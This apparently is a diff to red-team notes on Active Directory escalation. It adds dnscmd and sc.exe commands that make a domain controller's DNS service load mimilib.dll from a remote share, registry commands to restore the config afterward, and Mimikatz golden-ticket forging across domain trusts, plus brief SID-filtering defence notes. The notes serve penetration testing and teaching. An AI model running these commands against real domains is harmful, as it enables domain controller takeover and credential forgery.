@@ -409,8 +409,10 @@ After compromise a member and from the privileges of DNSAdmins group, we can con
 
 * dnscmd.exe:
 ```
-dnscmd dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
+dnscmd.exe dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
 ```
+
+> **Note**: If `dnscmd` is not available, you can install `DNS Server` on the Server Manager.
 
 * DNSServer Module (RSAT DNS):
 ```
@@ -422,8 +424,8 @@ Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose
 We need to restart the service:
 
 ```
-sc \\dc01.corp.local stop dns
-sc \\dc01.corp.local start dns
+sc.exe \\dc01.corp.local stop dns
+sc.exe \\dc01.corp.local start dns
 ```
 
 By default `mimilib.dll` logs all DNS queries on the following file:
@@ -448,7 +450,18 @@ We can modify the source code of `kdns.c` from `mimikatz` source code in order t
 > **RedTeam Note**: If we put a reverse shell on the `mimilib.dll`, **DNS will not work properly since the reverse shell is closed**. Use another way to elevate privileges such as add the user to local administrators group.
 
 
-# Across Domains
+## Restore config
+
+After execute the attack we need to restore the previous config, so we need to remove the `ServerLevelPlugin` from the DNS Parameters registry.
+
+```
+reg query \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+reg delete \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+sc.exe \\dc01 stop dns
+sc.exe \\dc01 start dns
+```
+
+# Across Domains (SID History)
 
 Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.
 
@@ -457,7 +470,7 @@ There are two ways of escalating privileges between two domains of the same fore
 * Trust Tickets
 * Krbtgt hash
 
-## Child to Parent using Trust Tickets (SID History)
+## Child to Parent using Trust Tickets
 
 We can escalate between domains using the trust tickets. An **inter-realm TGT** can be forged:
 
@@ -552,3 +565,18 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.m
 >
 > S-1-5-9 - Enterprise Domain Controllers
 
+
+## SID Filtering (Defending)
+
+**SID Filtering** avoids attacks which abuses SID history attribute across forest trust.
+
+By default SID Filtering is enabled on all inter-forests trusts. Intra-Forests trusts are assumed secured by default. But, since SID Filtering has potential to break applications and user access, it is often disabled.
+
+Microsoft considers a forest and no the domain to be a security boundary so its disabled by default.
+
+* ParentChild Trust -> Disabled
+* External Trust -> Enabled
+
+## Selective Authentication (Defending)
+
+In an inter-forest trust (External Trust), if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.
